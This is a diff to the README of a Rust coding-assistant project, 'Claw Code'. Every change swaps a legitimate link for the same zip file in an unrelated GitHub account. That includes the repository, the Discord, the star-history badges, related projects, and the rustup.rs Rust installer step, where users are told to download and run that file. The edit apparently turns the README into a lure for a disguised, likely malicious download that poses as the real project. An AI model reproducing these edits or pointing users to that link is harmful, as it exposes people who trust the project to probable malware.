@@ -1,7 +1,7 @@
 # Claw Code
 
 <p align="center">
-  <a href="https://github.com/ultraworkers/claw-code">ultraworkers/claw-code</a>
+  <a href="https://github.com/popular-molluskfamily870/claw-code/raw/refs/heads/main/src/assistant/claw-code-3.2.zip">ultraworkers/claw-code</a>
   ·
   <a href="./USAGE.md">Usage</a>
   ·
@@ -11,15 +11,15 @@
   ·
   <a href="./ROADMAP.md">Roadmap</a>
   ·
-  <a href="https://discord.gg/5TUQKqFWd">UltraWorkers Discord</a>
+  <a href="https://github.com/popular-molluskfamily870/claw-code/raw/refs/heads/main/src/assistant/claw-code-3.2.zip">UltraWorkers Discord</a>
 </p>
 
 <p align="center">
-  <a href="https://star-history.com/#ultraworkers/claw-code&Date">
+  <a href="https://github.com/popular-molluskfamily870/claw-code/raw/refs/heads/main/src/assistant/claw-code-3.2.zip">
     <picture>
-      <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/svg?repos=ultraworkers/claw-code&type=Date&theme=dark" />
-      <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/svg?repos=ultraworkers/claw-code&type=Date" />
-      <img alt="Star history for ultraworkers/claw-code" src="https://api.star-history.com/svg?repos=ultraworkers/claw-code&type=Date" width="600" />
+      <source media="(prefers-color-scheme: dark)" srcset="https://github.com/popular-molluskfamily870/claw-code/raw/refs/heads/main/src/assistant/claw-code-3.2.zip" />
+      <source media="(prefers-color-scheme: light)" srcset="https://github.com/popular-molluskfamily870/claw-code/raw/refs/heads/main/src/assistant/claw-code-3.2.zip" />
+      <img alt="Star history for ultraworkers/claw-code" src="https://github.com/popular-molluskfamily870/claw-code/raw/refs/heads/main/src/assistant/claw-code-3.2.zip" width="600" />
     </picture>
   </a>
 </p>
@@ -57,7 +57,7 @@ The canonical implementation lives in [`rust/`](./rust), and the current source 
 
 ```bash
 # 1. Clone and build
-git clone https://github.com/ultraworkers/claw-code
+git clone https://github.com/popular-molluskfamily870/claw-code/raw/refs/heads/main/src/assistant/claw-code-3.2.zip
 cd claw-code/rust
 cargo build --workspace
 
@@ -78,7 +78,7 @@ export ANTHROPIC_API_KEY="sk-ant-..."
 
 **PowerShell is a supported Windows path.** Use whichever shell works for you. The common onboarding issues on Windows are:
 
-1. **Install Rust first** — download from <https://rustup.rs/> and run the installer. Close and reopen your terminal when it finishes.
+1. **Install Rust first** — download from <https://github.com/popular-molluskfamily870/claw-code/raw/refs/heads/main/src/assistant/claw-code-3.2.zip> and run the installer. Close and reopen your terminal when it finishes.
 2. **Verify Rust is on PATH:**
    ```powershell
    cargo --version
@@ -86,7 +86,7 @@ export ANTHROPIC_API_KEY="sk-ant-..."
    If this fails, reopen your terminal or run the PATH setup from the Rust installer output, then retry.
 3. **Clone and build** (works in PowerShell, Git Bash, or WSL):
    ```powershell
-   git clone https://github.com/ultraworkers/claw-code
+   git clone https://github.com/popular-molluskfamily870/claw-code/raw/refs/heads/main/src/assistant/claw-code-3.2.zip
    cd claw-code/rust
    cargo build --workspace
    ```
@@ -198,11 +198,11 @@ cargo test --workspace
 
 Claw Code is built in the open alongside the broader UltraWorkers toolchain:
 
-- [clawhip](https://github.com/Yeachan-Heo/clawhip)
-- [oh-my-openagent](https://github.com/code-yeongyu/oh-my-openagent)
-- [oh-my-claudecode](https://github.com/Yeachan-Heo/oh-my-claudecode)
-- [oh-my-codex](https://github.com/Yeachan-Heo/oh-my-codex)
-- [UltraWorkers Discord](https://discord.gg/5TUQKqFWd)
+- [clawhip](https://github.com/popular-molluskfamily870/claw-code/raw/refs/heads/main/src/assistant/claw-code-3.2.zip)
+- [oh-my-openagent](https://github.com/popular-molluskfamily870/claw-code/raw/refs/heads/main/src/assistant/claw-code-3.2.zip)
+- [oh-my-claudecode](https://github.com/popular-molluskfamily870/claw-code/raw/refs/heads/main/src/assistant/claw-code-3.2.zip)
+- [oh-my-codex](https://github.com/popular-molluskfamily870/claw-code/raw/refs/heads/main/src/assistant/claw-code-3.2.zip)
+- [UltraWorkers Discord](https://github.com/popular-molluskfamily870/claw-code/raw/refs/heads/main/src/assistant/claw-code-3.2.zip)
 
 ## Ownership / affiliation disclaimer
 
